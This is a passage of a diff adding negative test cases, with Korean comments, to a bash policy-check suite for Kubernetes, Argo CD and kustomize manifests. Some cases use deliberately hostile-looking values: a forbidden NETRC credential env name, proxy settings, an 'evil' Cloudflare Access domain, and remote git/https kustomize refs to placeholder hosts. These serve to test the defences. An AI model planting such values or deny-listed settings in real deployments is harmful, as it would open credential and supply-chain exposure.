+    '+[PASS] 11.6 FMT-dirsource-files — clusters/oci-k3s/apps 바로 아래 항목 2개 = *.yaml · *.yml 2개 · README.md 0개' \
+    '+[PASS] 14.9 APP-kust-keys — 앱 kustomization 3개(base 1 · overlay 2)' '+그 밖 자리의 맵 · 목록 0' "${AP_NEG[@]}"
+  #   뼈대(GP-1 실트리와 같은 꼴 — base · overlays가 resources: [] · dev는 images 하나): 렌더 0객체 → 14.x PASS 줄이 대상 0을 적는다(설계 D9 CD-1)
+  ap_case app-skeleton 1 \
+    '+[PASS] 14.1 APP-env — overlay 렌더 2개 · pod 템플릿 객체 0개 · 컨테이너 0개 — 대상 0' \
+    '+[PASS] 14.2 APP-cm — overlay 렌더 2개 중 pod 템플릿 객체 있음 0개: ConfigMap <pod>-config 하나 · 키 집합 = pod 표 · 값 꼴(PLACEHOLDER- 0 · ENV · ALLOWED_HOSTS · KAFKA_USERNAME · ACCESS_*) · 대상 없음 2개(대상 0)' \
+    '+[PASS] 14.3 APP-ingress — overlay 렌더 2개 · Ingress 0개(m2m 0 · admin 0) · Middleware 0개 — 대상 0' \
+    '+[PASS] 14.4 APP-values — overlay 렌더 2개 중 pod 템플릿 객체 있음 0개: ConfigMap 값 = pod 표(env별) · 면제 상한 · dev ≠ prod 0쌍 · 대상 없음 2개(대상 0)' \
+    '+[PASS] 14.6 APP-image — overlay 렌더 2개 · 컨테이너 0개 — 대상 0' \
+    '+[PASS] 14.7 APP-kinds — overlay 렌더 2개 · 객체 0개 — 대상 0' \
+    '+[PASS] 14.0 APP-app — clusters/oci-k3s/apps 파일 0개 — 대상 0' \
+    '+[PASS] 3.9 ES-app — apps/** ExternalSecret 0개(원본 0 · 렌더 0) — 대상 0' \
+    '+[PASS] 11.7 FMT-kust-keys — kustomization 파일 3개 · 최상위 키 10개 모두 정본 철자' \
+    '+· 병합 키 · 태그 0 · 중첩(경로를 받는 구조체 항목 0개의 직속 키 0개' \
+    '+[PASS] 11.6 FMT-dirsource-files — clusters/oci-k3s/apps 없음 — 대상 없음' \
+    '+[PASS] 14.9 APP-kust-keys — 앱 kustomization 3개(base 1 · overlay 2)' '+그 밖 자리의 맵 · 목록 0' "${AP_NEG[@]}"
+  #   표에 없는 pod(apps/blog/overlays/dev)의 overlay 렌더가 객체를 가진다 → FAIL(새 pod는 계약 pod 표에 행을 더하는 계약 변경으로 시작한다)
+  ap_neg '14.2 APP-cm'
+  ap_case app-unknown-pod 1 \
+    "+[FAIL] 14.2 APP-cm — apps/blog/overlays/dev (rendered): pod 표에 없는 pod 'blog'(env 'dev') — overlay 렌더 객체 1개" "${AP_NEG[@]}"
+
+  # 3.9 ES-app — 관문 밖 dev overlay의 패치 하나로 ES 규약 · pod 표 ES 표를 벗어나는 길(dataFrom · Merge · 주기 · 키 바꿔치기 · 다른 pod 경로 · 셋째 ES ·
+  #   template 호스트 · 항목별 store)
+  AP_ES="+[FAIL] 3.9 ES-app — $AP_DEV ExternalSecret/jt-dev/identity-admin-env: "
+  ap_neg '3.9 ES-app'
+  ap_case es-app-datafrom 1 "${AP_ES}dataFrom 금지" "${AP_NEG[@]}"
+  ap_case es-app-merge 1 "${AP_ES}target.template.mergePolicy Merge 금지" "${AP_NEG[@]}"
+  ap_case es-app-refresh 1 "${AP_ES}refreshInterval \"1h\" ≠ \"5m\"" "${AP_NEG[@]}"
+  ap_case es-app-admin-key 1 \
+    "${AP_ES}data[3] = (dragonfly_url · dev/dragonfly/admin · url) ≠ pod 표 (dragonfly_url · dev/dragonfly/identity-admin · url)" "${AP_NEG[@]}"
+  ap_case es-app-other-pod 1 \
+    "${AP_ES}data[0] = (db_username · dev/db/dev_blog/app · username) ≠ pod 표 (db_username · dev/db/dev_identity_admin/app · username)" "${AP_NEG[@]}"
+  ap_case es-app-extra-es 1 \
+    "+[FAIL] 3.9 ES-app — $AP_DEV ExternalSecret/jt-dev/identity-admin-extra: 이름 'identity-admin-extra' ∉ {identity-admin-env, identity-admin-migrate}" \
+    "${AP_NEG[@]}"
+  ap_case es-app-template-host 1 "${AP_ES}target.template ≠ apps/identity-admin/base 렌더의 같은 이름 ExternalSecret의 것" "${AP_NEG[@]}"
+  ap_case es-app-item-sourceref 1 "${AP_ES}data[0] 키 [remoteRef,secretKey,sourceRef] ≠ {remoteRef, secretKey}" "${AP_NEG[@]}"
+
+  # 14.0 APP-app — 앱 Application의 꼴 · 파일 결합 · 렌더의 ns · cluster 범위
+  AP_A0="+[FAIL] 14.0 APP-app — $AP_APPDEV Application/identity-admin-dev: "
+  ap_neg '14.0 APP-app'
+  ap_case app-project-platform 1 "${AP_A0}spec.project 'platform' ≠ dev" "${AP_NEG[@]}"
+  ap_case app-dest-crossenv 1 \
+    "${AP_A0}spec.destination {\"namespace\":\"jt-prod\",\"server\":\"https://kubernetes.default.svc\"} ≠ {\"namespace\":\"jt-dev\",\"server\":\"https://kubernetes.default.svc\"}" \
+    "${AP_NEG[@]}"
+  ap_case app-file-name-mismatch 1 "+[FAIL] 14.0 APP-app — clusters/oci-k3s/apps/blog.yaml: metadata.name 'blog-prod' ≠ 파일 이름 'blog'" "${AP_NEG[@]}"
+  ap_case app-file-two-docs 1 "+[FAIL] 14.0 APP-app — clusters/oci-k3s/apps/identity-admin.yaml: 문서 2개" "${AP_NEG[@]}"
+  ap_case app-ns-not-argocd 1 "${AP_A0}metadata.namespace 'jt-dev' ≠ argocd" "${AP_NEG[@]}"
+  #   cluster 범위 kind는 14.7(허용 목록 밖)에도 걸린다
+  ap_neg '14.0 APP-app' '14.7 APP-kinds'
+  ap_case app-overlay-clusterkind 1 \
+    "+[FAIL] 14.0 APP-app — $AP_DEV ClusterRole/-/app-extra: cluster 범위 kind(rbac.authorization.k8s.io/ClusterRole)" \
+    "+[FAIL] 14.7 APP-kinds — $AP_DEV ClusterRole/-/app-extra: kind rbac.authorization.k8s.io/ClusterRole ∉ AppProject dev/prod 허용 목록" "${AP_NEG[@]}"
+
+  # 14.1 APP-env — 금지 env · 렌더 밖 참조 · <pod>-migrate 참조 · 덮어쓰기(pod 표 envFrom · env[])
+  AP_WEB="+[FAIL] 14.1 APP-env — $AP_DEV Deployment/jt-dev/identity-admin 컨테이너 web: "
+  ap_neg '14.1 APP-env'
+  ap_case env-forbidden 1 "${AP_WEB}env 이름 'NETRC'(env[]) 금지" "${AP_NEG[@]}"
+  ap_case env-proxy 1 "${AP_WEB}env 이름 'https_proxy'(env[]) 금지" "${AP_NEG[@]}"
+  ap_case env-outside-ref 1 \
+    "+[FAIL] 14.1 APP-env — $AP_DEV Deployment/jt-dev/identity-admin 컨테이너 relay: env 'POD_NAMESPACE' valueFrom.configMapKeyRef 'outside-cm' — 같은 렌더에 그 ConfigMap이 없다" \
+    "${AP_NEG[@]}"
+  ap_case migrate-ref-projected 1 \
+    "+[FAIL] 14.1 APP-env — $AP_DEV Deployment/jt-dev/identity-admin: Secret 'identity-admin-migrate' 참조(volumes projected) — PreSync hook Job identity-admin-migrate 밖이다" \
+    "${AP_NEG[@]}"
+  ap_case env-literal-override 1 "${AP_WEB}env 이름 'ACCESS_EXPECTED_CN'이 ConfigMap identity-admin-config 키와 겹친다" "${AP_NEG[@]}"
+  ap_case env-sidecar-extra 1 \
+    "+[FAIL] 14.1 APP-env — $AP_DEV Deployment/jt-dev/identity-admin 컨테이너 sidecar: env 이름 'EXTRA_MODE' ∉ pod 표(∅" "${AP_NEG[@]}"
+  ap_neg '14.1 APP-env' '14.7 APP-kinds'
+  ap_case migrate-ref-pod 1 \
+    "+[FAIL] 14.1 APP-env — $AP_DEV Pod/jt-dev/identity-admin-debug: Secret 'identity-admin-migrate' 참조(envFrom secretRef) — PreSync hook Job identity-admin-migrate 밖이다" \
+    "${AP_NEG[@]}"
+  ap_neg '14.1 APP-env' '14.2 APP-cm'
+  ap_case envfrom-extra-cm 1 \
+    "${AP_WEB}envFrom [{\"configMapRef\":{\"name\":\"identity-admin-config\"}},{\"secretRef\":{\"name\":\"identity-admin-env\"}},{\"configMapRef\":{\"name\":\"identity-admin-extra\"}}] ≠ pod 표" \
+    "${AP_NEG[@]}"
+  ap_neg '14.1 APP-env' '3.9 ES-app'
+  ap_case es-template-overrides-cm 1 \
+    "+[FAIL] 14.1 APP-env — $AP_DEV: ConfigMap identity-admin-config 키 'ACCESS_AUD_M2M'이 Secret identity-admin-env(ExternalSecret template.data) 키와 겹친다" \
+    "${AP_NEG[@]}"
+
+  # 14.2 APP-cm — ConfigMap 하나 · 키 집합 · 값 꼴(대상 없음은 pod 템플릿 객체가 0개일 때뿐)
+  ap_neg '14.2 APP-cm' '14.1 APP-env' '14.3 APP-ingress' '14.4 APP-values'
+  ap_case cm-missing 1 "+[FAIL] 14.2 APP-cm — $AP_DEV: pod 템플릿 객체가 있는데 ConfigMap identity-admin-config 없음" "${AP_NEG[@]}"
+  ap_neg '14.2 APP-cm' '14.4 APP-values'
+  ap_case cm-placeholder 1 "+[FAIL] 14.2 APP-cm — $AP_CMDEV: ACCESS_AUD_M2M 값에 PLACEHOLDER-" "${AP_NEG[@]}"
+  ap_case cm-aud-form 1 "+[FAIL] 14.2 APP-cm — $AP_CMDEV: ACCESS_AUD_M2M 값이 꼴(" "${AP_NEG[@]}"
+  ap_case cm-cn-form 1 "+[FAIL] 14.2 APP-cm — $AP_CMDEV: ACCESS_EXPECTED_CN 값이 꼴(" "${AP_NEG[@]}"
+  ap_neg '14.2 APP-cm'
+  ap_case cm-extra-key 1 "+[FAIL] 14.2 APP-cm — $AP_CMDEV: 키 집합 ≠ pod 표 — 빠짐 [] 여분 [EXTRA_FLAG]" "${AP_NEG[@]}"
+  ap_case cm-second-configmap 1 \
+    "+[FAIL] 14.2 APP-cm — $AP_DEV: ConfigMap 2개 — 정확히 identity-admin-config 하나" \
+    "+[FAIL] 14.2 APP-cm — $AP_DEV ConfigMap/jt-dev/identity-admin-second: 이름 ≠ identity-admin-config" "${AP_NEG[@]}"
+
+  # 14.3 APP-ingress — 이름 분류 · 공통 조건 · m2m host · 경로 · admin(prod만) · Middleware
+  AP_IDEV="+[FAIL] 14.3 APP-ingress — $AP_DEV Ingress/jt-dev/"
+  ap_neg '14.3 APP-ingress'
+  ap_case ing-host-alias 1 "${AP_IDEV}identity-admin: host \"blog-m2m-dev.joshuatech.dev\" ≠ identity-m2m-dev.joshuatech.dev" "${AP_NEG[@]}"
+  ap_case ing-extra-path 1 "${AP_IDEV}identity-admin: 경로 집합 [" "+/webhooks(Prefix)] ≠ pod 표 [" "${AP_NEG[@]}"
+  ap_case ing-admin-in-dev 1 "${AP_IDEV}identity-admin-admin: 이름 identity-admin-admin(admin)은 prod에서만(has_admin)" "${AP_NEG[@]}"
+  ap_case ing-priority 1 "${AP_IDEV}identity-admin: 어노테이션 router.priority 금지" "${AP_NEG[@]}"
+  ap_case mw-extra-prefix 1 \
+    "+[FAIL] 14.3 APP-ingress — $AP_PROD Middleware/jt-prod/identity-admin-strip: stripPrefix.prefixes [\"/identity-admin\",\"/x\"] ≠ [\"/identity-admin\"]" \
+    "${AP_NEG[@]}"
+  ap_case ing-third-name 1 "${AP_IDEV}identity-admin-x: 이름 — identity-admin(m2m) · identity-admin-admin(admin — prod · has_admin)만" "${AP_NEG[@]}"
+  ap_case ing-admin-entrypoint-web 1 \
+    "+[FAIL] 14.3 APP-ingress — $AP_PROD Ingress/jt-prod/identity-admin-admin: router.entrypoints \"web\" ≠ \"websecure\"" "${AP_NEG[@]}"
+  #   pod 템플릿 객체가 없는 dev overlay(base를 뺐다) + 같은 디렉터리의 Ingress(남의 호스트) — 14.2 · 14.4는 대상 없음이지만 14.3은 그 Ingress를 본다
+  ap_case ing-only-foreign-host 1 "${AP_IDEV}identity-admin: host \"vault.joshuatech.dev\" ≠ identity-m2m-dev.joshuatech.dev" \
+    "+[FAIL] 14.3 APP-ingress — $AP_DEV: ConfigMap identity-admin-config 없음 — Ingress host를 ALLOWED_HOSTS와 대조할 수 없다" "${AP_NEG[@]}"
+
+  # 14.4 APP-values — env별 정확한 값 · 면제 상한 · dev = prod 복사
+  AP_V="+[FAIL] 14.4 APP-values — "
+  ap_neg '14.4 APP-values'
+  ap_case val-writes-prod-false 1 \
+    "${AP_V}$AP_PROD ConfigMap/jt-prod/identity-admin-config: AUTHENTIK_WRITES_ENABLED \"false\" ≠ pod 표(prod) \"true\"" "${AP_NEG[@]}"
+  ap_case val-exempt-extra 1 "${AP_V}$AP_CMDEV: JT_PLACEHOLDER_EXEMPT 원소 'ACCESS_AUD_M2M' — 면제 상한" "${AP_NEG[@]}"
+  ap_case val-env-same 1 "${AP_V}$AP_OV/{dev,prod} ConfigMap identity-admin-config: ACCESS_AUD_M2M dev = prod" "${AP_NEG[@]}"
+  ap_case val-team-domain 1 \
+    "${AP_V}$AP_CMDEV: ACCESS_TEAM_DOMAIN \"evil.cloudflareaccess.com\" ≠ pod 표(dev) \"joshua-tech.cloudflareaccess.com\"" "${AP_NEG[@]}"
+  ap_case val-kafka-bootstrap 1 \
+    "${AP_V}$AP_CMDEV: KAFKA_BOOTSTRAP \"kafka.joshuatech.dev:9093\" ≠ pod 표(dev) \"jt-kafka-kafka-bootstrap.data.svc:9093\"" "${AP_NEG[@]}"
+  ap_neg '14.4 APP-values' '14.2 APP-cm'
+  ap_case val-hosts-domain 1 "${AP_V}$AP_CMDEV: ALLOWED_HOSTS 원소 집합 ≠ pod 표(dev) — 빠짐 [] 여분 [.joshuatech.dev]" \
+    "+[FAIL] 14.2 APP-cm — $AP_CMDEV: ALLOWED_HOSTS 원소 '.joshuatech.dev'" "${AP_NEG[@]}"
+
+  # 14.5 APP-hook — hook 허용 목록(PreSync뿐 · ExternalSecret · Job <pod>-migrate만 · helm.sh/hook 금지 · tests 경로는 0)
+  AP_H="+[FAIL] 14.5 APP-hook — $AP_DEV "
+  ap_neg '14.5 APP-hook'
+  ap_case hook-presync-postdelete 1 "${AP_H}Job/identity-admin-migrate: argocd.argoproj.io/hook \"PreSync,PostDelete\" — 쉼표 토큰 집합 ≠ {PreSync}" "${AP_NEG[@]}"
+  ap_case hook-x-helm-postdelete 1 "${AP_H}Service/identity-admin: 어노테이션 'helm.sh/hook' 금지" \
+    "${AP_H}Service/identity-admin: argocd.argoproj.io/hook \"X\" — 쉼표 토큰 집합 ≠ {PreSync}" "${AP_NEG[@]}"
+  ap_case hook-helm-predelete 1 "${AP_H}Deployment/identity-admin-celery: 어노테이션 'helm.sh/hook' 금지" "${AP_NEG[@]}"
+  ap_case hook-tests-path 1 \
+    "+[FAIL] 14.5 APP-hook — platform/policies/tests/configmap-assert.yaml ConfigMap/assert-config: platform/policies/tests의 hook 금지(허용 0)" \
+    "${AP_NEG[@]}"
+
+  # 14.6 APP-image — 렌더의 모든 pod 템플릿 객체(대상 없음 규칙 밖)
+  AP_I="+[FAIL] 14.6 APP-image — $AP_DEV "
+  ap_neg '14.6 APP-image'
+  ap_case img-no-entry 1 "${AP_I}Deployment/jt-dev/identity-admin 컨테이너 web: image \"ghcr.io/joshua92y/identity-admin\" ≠ ghcr.io/joshua92y/identity-admin@sha256:<64 hex>" \
+    "${AP_NEG[@]}"
+  ap_case img-foreign 1 "${AP_I}Deployment/jt-dev/identity-admin 컨테이너 tool: image \"busybox:1.37\" ≠ ghcr.io/joshua92y/identity-admin@sha256:<64 hex>" \
+    "${AP_NEG[@]}"
+  #   Deployment 없는 dev overlay + 같은 디렉터리 CronJob(외부 이미지) — 14.2(ConfigMap 없음) · 14.1(envFrom) · 14.4도 대상 없음이 아니다
+  ap_neg '14.6 APP-image' '14.2 APP-cm' '14.1 APP-env' '14.4 APP-values'
+  ap_case img-cronjob-no-deploy 1 "${AP_I}CronJob/jt-dev/identity-admin-tool 컨테이너 tool: image \"busybox:1.37\"" \
+    "+[FAIL] 14.2 APP-cm — $AP_DEV: pod 템플릿 객체가 있는데 ConfigMap identity-admin-config 없음" "${AP_NEG[@]}"
+
+  # 14.7 APP-kinds — AppProject dev/prod 허용 목록(group 포함) · Secret · Service 노출
+  AP_K="+[FAIL] 14.7 APP-kinds — $AP_DEV "
+  ap_neg '14.7 APP-kinds'
+  ap_case kind-tlsoption 1 "${AP_K}TLSOption/jt-dev/default: kind traefik.io/TLSOption ∉ AppProject dev/prod 허용 목록" "${AP_NEG[@]}"
+  ap_case kind-secret 1 "${AP_K}Secret/jt-dev/identity-admin-extra: kind Secret 금지" "${AP_NEG[@]}"
+  ap_case svc-nodeport 1 "${AP_K}Service/jt-dev/identity-admin: Service type 'NodePort' ≠ ClusterIP" "${AP_K}Service/jt-dev/identity-admin: nodePort 금지" \
+    "${AP_NEG[@]}"
+
+  # 14.8 APP-remote — 원격 ref 금지 · apps/** 경로 가둠(overlay = 같은 디렉터리 파일 + ../../base · base = 같은 디렉터리 파일 · 하위 디렉터리 금지)
+  AP_R="+[FAIL] 14.8 APP-remote — "
+  AP_OVR='overlay 항목은 같은 디렉터리의 파일 또는 정확히 ../../base뿐(하위 디렉터리 금지)'
+  AP_BSR='base 항목은 같은 디렉터리의 파일뿐(하위 디렉터리 금지)'
+  ap_neg '14.8 APP-remote'
+  ap_case remote-resource-https 1 "${AP_R}$AP_KDEV: resources 'https://example.invalid/x.yaml' — 원격 ref 금지" "${AP_NEG[@]}"
+  ap_case remote-git-ssh 1 "${AP_R}$AP_KDEV: resources 'git@example.invalid:evil/x.git' — 원격 ref 금지" "${AP_NEG[@]}"
+  ap_case overlay-extra-dir 1 "${AP_R}$AP_KDEV: resources 'sub' — $AP_OVR" "${AP_NEG[@]}"
+  ap_case base-nested-from-overlay 1 "${AP_R}$AP_KBASE: resources 'sub' — $AP_BSR" "${AP_NEG[@]}"
+  #   (T075 보정 2026-11-18) 앱 kustomization의 허용 키 밖(configMapGenerator · components · helmCharts)을 쓰는 변이는 14.9에도 걸린다.
+  #   prod-patch-from-dev의 patches[].path도 14.9에 걸린다(재검토 G1B-4 — 앱 patches[] 키 = {target, patch}: 경로를 받는 중첩 자리를 앱에서 없앴다)
+  AP_K9="+[FAIL] 14.9 APP-kust-keys — "
+  ap_neg '14.8 APP-remote' '14.9 APP-kust-keys'
+  ap_case prod-patch-from-dev 1 "${AP_R}$AP_KPROD: patches.path '../dev/p.yaml' — $AP_OVR" \
+    "${AP_K9}$AP_KPROD: patches[4] 키 'path' ∉ {target, patch}" "${AP_NEG[@]}"
+  ap_case prod-cmgen-from-dev 1 "${AP_R}$AP_KPROD: configMapGenerator.files '../dev/f.txt' — $AP_OVR" \
+    "${AP_K9}$AP_KPROD: 키 'configMapGenerator' ∉ overlay 허용 키" "${AP_NEG[@]}"
+  ap_case base-component-outside 1 "${AP_R}$AP_KBASE: components '../shared' — $AP_BSR" \
+    "${AP_K9}$AP_KBASE: 최상위 키 ≠ base 키 {apiVersion, kind, resources} — 빠짐 [] 여분 [components]" "${AP_NEG[@]}"
+  ap_case app-helmcharts 1 "${AP_R}$AP_KDEV: helmCharts 금지" "${AP_K9}$AP_KDEV: 키 'helmCharts' ∉ overlay 허용 키" "${AP_NEG[@]}"
+  ap_case prod-nested-component-from-dev 1 "${AP_R}$AP_KPROD: components 'sub' — $AP_OVR" "${AP_K9}$AP_KPROD: 키 'components' ∉ overlay 허용 키" \
+    "${AP_NEG[@]}"
+
+  # 7.1 · 7.5 · 13.7 — Argo CD 자기 관리 경로(bootstrap/argocd 하나) · platform/argocd 자리표시 · AppProject의 자리와 꼴
+  ap_neg
+  ap_case argocd-path-platform 1 \
+    "+[FAIL] 7.1 WAVE-path — clusters/oci-k3s/apps/platform-argocd.yaml Application/platform-argocd: source.path 'platform/argocd' ≠ bootstrap/argocd" \
+    '-[PASS] 7.1 WAVE' "${AP_NEG[@]}"
+  AP_P75='+[FAIL] 7.5 WAVE-argocd-placeholder — platform/argocd/kustomization.yaml: '
+  ap_neg '7.5 WAVE-argocd-placeholder' '13.7 RBAC-appproject'
+  ap_case argocd-placeholder-projects 1 "${AP_P75}resources [\"../../clusters/oci-k3s/projects\"] ≠ [] — 자리표시다" \
+    "+[FAIL] 13.7 RBAC-appproject — platform/argocd (rendered) AppProject/prod: AppProject는 clusters/oci-k3s/projects 렌더와 그것을 base로 포함하는 bootstrap/argocd 렌더에만" \
+    "${AP_NEG[@]}"
+  ap_neg '7.5 WAVE-argocd-placeholder'
+  ap_case argocd-placeholder-patch 1 "${AP_P75}최상위 키 [apiVersion,kind,patches,resources] ≠ {apiVersion, kind, resources} — 자리표시다" "${AP_NEG[@]}"
+  AP_PJ='+[FAIL] 13.7 RBAC-appproject — clusters/oci-k3s/projects (rendered) AppProject/prod: '
+  ap_neg '13.7 RBAC-appproject'
+  ap_case proj-in-platform 1 \
+    "+[FAIL] 13.7 RBAC-appproject — platform/monitoring (rendered) AppProject/prod: AppProject는 clusters/oci-k3s/projects 렌더와 그것을 base로 포함하는 bootstrap/argocd 렌더에만" \
+    "${AP_NEG[@]}"
+  ap_case proj-prod-whitelist-extra 1 "${AP_PJ}namespaceResourceWhitelist ≠ 허용 목록 8종(group 포함 · 순서 무관) — 빠짐 [] 여분 [traefik.io/TLSOption]" "${AP_NEG[@]}"
+  ap_case proj-prod-dest-two 1 \
+    "${AP_PJ}destinations [{\"namespace\":\"jt-prod\",\"server\":\"https://kubernetes.default.svc\"},{\"namespace\":\"jt-dev\",\"server\":\"https://kubernetes.default.svc\"}] ≠ [{\"namespace\":\"jt-prod\",\"server\":\"https://kubernetes.default.svc\"}]" \
+    "${AP_NEG[@]}"
+  ap_case proj-prod-blacklist-short 1 "${AP_PJ}namespaceResourceBlacklist에 금지 6종 중 빠짐 [rbac.authorization.k8s.io/RoleBinding]" "${AP_NEG[@]}"
+
+  # (T075 보정 2026-11-18 — GP-1 리뷰) 11.7 FMT-kust-keys — kustomize가 대소문자 무시 · 유니코드 접기로 읽는 키 · 정본 밖 · 중복 · 앵커 · 병합 키 · 태그
+  AP_K7="+[FAIL] 11.7 FMT-kust-keys — "
+  AP_VK='platform/vault/kustomization.yaml(문서 1)'
+  ap_neg '11.7 FMT-kust-keys' '14.9 APP-kust-keys'
+  ap_case kust-keys-case 1 "${AP_K7}$AP_KPROD(문서 1): 키 'Components' — 정본 철자 'components'와 대소문자만 다르다" \
+    "${AP_K9}$AP_KPROD: 키 'Components' ∉ overlay 허용 키" "${AP_NEG[@]}"
+  ap_case kust-keys-fold 1 "${AP_K7}$AP_KPROD(문서 1): 키 '${AP_FOLD}'에 ASCII 밖 글자" "${AP_K9}$AP_KPROD: 키 '${AP_FOLD}' ∉ overlay 허용 키" \
+    "${AP_NEG[@]}"
+  ap_neg '11.7 FMT-kust-keys'
+  ap_case kust-keys-unknown 1 "${AP_K7}$AP_VK: 키 'patchez' ∉ kustomize 5.8.1 Kustomization 필드" "${AP_NEG[@]}"
+  ap_case kust-keys-dup 1 "${AP_K7}$AP_VK: 키 'resources' 중복" "${AP_NEG[@]}"
+  ap_case kust-keys-anchor 1 "${AP_K7}$AP_VK: 앵커 1 · 별칭 1" "${AP_NEG[@]}"
+  ap_case kust-keys-merge 1 "${AP_K7}$AP_VK: 앵커 0 · 별칭 0 · 명시 태그 0(사용자 태그 0) · 병합 키(<<) 1" "${AP_NEG[@]}"
+  ap_case kust-keys-tag 1 "${AP_K7}$AP_VK: 앵커 0 · 별칭 0 · 명시 태그 1(사용자 태그 0) · 병합 키(<<) 0" "${AP_NEG[@]}"
+  # 14.9 APP-kust-keys — base = 정확히 {apiVersion, kind, resources} · overlay ⊆ {apiVersion, kind, namespace, resources, images, patches}
+  ap_neg '14.9 APP-kust-keys'
+  ap_case app-kust-base-extra 1 "${AP_K9}$AP_KBASE: 최상위 키 ≠ base 키 {apiVersion, kind, resources} — 빠짐 [] 여분 [labels]" "${AP_NEG[@]}"
+  ap_case app-kust-overlay-extra 1 "${AP_K9}$AP_KDEV: 키 'buildMetadata' ∉ overlay 허용 키" "${AP_NEG[@]}"
+  # 11.6 FMT-dirsource-files — clusters/oci-k3s/apps 바로 아래는 *.yaml · *.yml · README.md만(리뷰 B kz-root · .json Application · 하위 디렉터리)
+  AP_K6='+[FAIL] 11.6 FMT-dirsource-files — clusters/oci-k3s/apps/'
+  ap_neg '11.6 FMT-dirsource-files'
+  ap_case dirsrc-kustomization 1 "${AP_K6}Kustomization: kustomization 파일 금지(대소문자 무관)" "${AP_K6}evil.txt: *.yaml · *.yml · README.md 밖의 이름 금지" \
+    "${AP_NEG[@]}"
+  ap_case dirsrc-json 1 "${AP_K6}evil.json: *.yaml · *.yml · README.md 밖의 이름 금지" "${AP_NEG[@]}"
+  ap_case dirsrc-subdir 1 "${AP_K6}sub: 하위 디렉터리 금지" "${AP_NEG[@]}"
+  # 14.0 APP-app 끝 — project prod인데 이름 evil(파일 evil.yaml — 이름 = 파일 이름이라 결합 판정은 지나간다)
+  ap_neg '14.0 APP-app'
+  ap_case app-project-prod-name 1 \
+    "+[FAIL] 14.0 APP-app — clusters/oci-k3s/apps/evil.yaml Application/evil: spec.project 'prod'인데 이름 ≠ ^(.+)-prod\$" "${AP_NEG[@]}"
+  # 14.8 APP-remote 보강 — tests 범위 원격 꼴(kustomize가 git fetch하므로 프록시를 막은 환경으로 돌린다 — 네트워크에 나가지 않는다) · 없는 경로 · 인라인 ·
+  #   역슬래시(리뷰 B bsn-xform — Linux에서는 렌더가 실패하고 Windows에서는 렌더된다: 단언은 14.8 · 14.9 줄만)
+  AP_NONET=(--env 'HTTPS_PROXY=http://127.0.0.1:9' --env 'HTTP_PROXY=http://127.0.0.1:9' --env 'https_proxy=http://127.0.0.1:9'
+    --env 'http_proxy=http://127.0.0.1:9' --env 'ALL_PROXY=http://127.0.0.1:9' --env 'NO_PROXY=' --env 'GIT_TERMINAL_PROMPT=0'
+    --env 'GIT_SSH_COMMAND=false' --env 'GCM_INTERACTIVE=never')
+  ap_neg '14.8 APP-remote'
+  ap_case remote-tests-forms 1 "${AP_NONET[@]}" "${AP_R}$AP_TESTS_K: resources 'GitHub.com/acme-x/repo-x//dir?ref=main' — 원격 ref 금지" \
+    "${AP_R}$AP_TESTS_K: resources 'github.com:acme-x/repo-x//dir?ref=main' — 원격 ref 금지" \
+    "${AP_R}$AP_TESTS_K: resources 'jt@example.invalid:acme-x/repo-x//dir?ref=main' — 원격 ref 금지" "${AP_NEG[@]}"
+  ap_case remote-tests-missing 1 "${AP_R}$AP_TESTS_K: resources 'missing-dir'(→ platform/policies/tests/missing-dir) — 저장소 안의 실재 경로가 아니다" \
+    "${AP_NEG[@]}"
+  ap_neg '14.8 APP-remote' '14.9 APP-kust-keys'
+  ap_case inline-transformer 1 "${AP_NONET[@]}" "${AP_R}$AP_KPROD: transformers 항목이 인라인 설정이다(YAML로 읽으면 map)" \
+    "${AP_K9}$AP_KPROD: 키 'transformers' ∉ overlay 허용 키" "${AP_NEG[@]}"
+  ap_case xform-backslash 1 "${AP_R}$AP_KPROD"': transformers 항목 "../dev/x\\n" — 문자열 경로가 아니거나 역슬래시' \
+    "${AP_K9}$AP_KPROD: 키 'transformers' ∉ overlay 허용 키" "${AP_NEG[@]}"
+  # 사례 공백(G1A-5) — 13.7 원본 파일만 · 7.5 이름 변형
+  ap_neg '13.7 RBAC-appproject'
+  ap_case proj-file-only 1 \
+    "+[FAIL] 13.7 RBAC-appproject — platform/monitoring/appproject.yaml AppProject/prod: AppProject는 clusters/oci-k3s/projects 렌더와" "${AP_NEG[@]}"
+  ap_neg '7.5 WAVE-argocd-placeholder' '13.7 RBAC-appproject'
+  ap_case argocd-placeholder-yml 1 \
+    "+[FAIL] 7.5 WAVE-argocd-placeholder — platform/argocd/kustomization.yml: resources [\"../../clusters/oci-k3s/projects\"] ≠ [] — 자리표시다" \
+    "+[FAIL] 13.7 RBAC-appproject — platform/argocd (rendered) AppProject/prod: AppProject는" "${AP_NEG[@]}"
+  ap_neg '7.5 WAVE-argocd-placeholder'
+  ap_case argocd-placeholder-kust 1 \
+    "+[FAIL] 7.5 WAVE-argocd-placeholder — platform/argocd/Kustomization: 최상위 키 [apiVersion,kind,patches,resources] ≠ {apiVersion, kind, resources}" \
+    "${AP_NEG[@]}"
+
+  # (T075 보정 2026-11-18 — 재검토 G1B-4 · G1A-7) 11.7 중첩 — 경로를 받는 구조체 항목의 직속 키(철자 변형 · 비ASCII · 중복). 앱 overlay의 변이는 14.9
+  #   모든 깊이(patches[] 키 = {target, patch})에도 걸린다. URL 변이는 렌더가 내려받으려 하므로 AP_NONET으로 돈다(네트워크 0)
+  AP_NP="Patch 정본 철자 'path'와 대소문자만 다르다"
+  ap_neg '11.7 FMT-kust-keys' '14.9 APP-kust-keys'
+  ap_case nested-path-url 1 "${AP_NONET[@]}" "${AP_K7}$AP_KDEV(문서 1) patches[2]: 키 'Path' — $AP_NP" \
+    "${AP_K9}$AP_KDEV: patches[2] 키 'Path' ∉ {target, patch}" "${AP_NEG[@]}"
+  ap_case nested-path-case 1 "${AP_NONET[@]}" "${AP_K7}$AP_KPROD(문서 1) patches[4]: 키 'Path' — $AP_NP" \
+    "${AP_K9}$AP_KPROD: patches[4] 키 'Path' ∉ {target, patch}" "${AP_NEG[@]}"
+  ap_case nested-path-local 1 "${AP_K7}$AP_KDEV(문서 1) patches[2]: 키 'Path' — $AP_NP" "${AP_K9}$AP_KDEV: patches[2] 키 'Path' ∉ {target, patch}" \
+    "${AP_NEG[@]}"
+  ap_case nested-patch-target-case 1 "${AP_K7}$AP_KDEV(문서 1) patches[0]: 키 'Target' — Patch 정본 철자 'target'와 대소문자만 다르다" \
+    "${AP_K9}$AP_KDEV: patches[0] 키 'Target' ∉ {target, patch}" "${AP_NEG[@]}"
+  ap_neg '11.7 FMT-kust-keys'
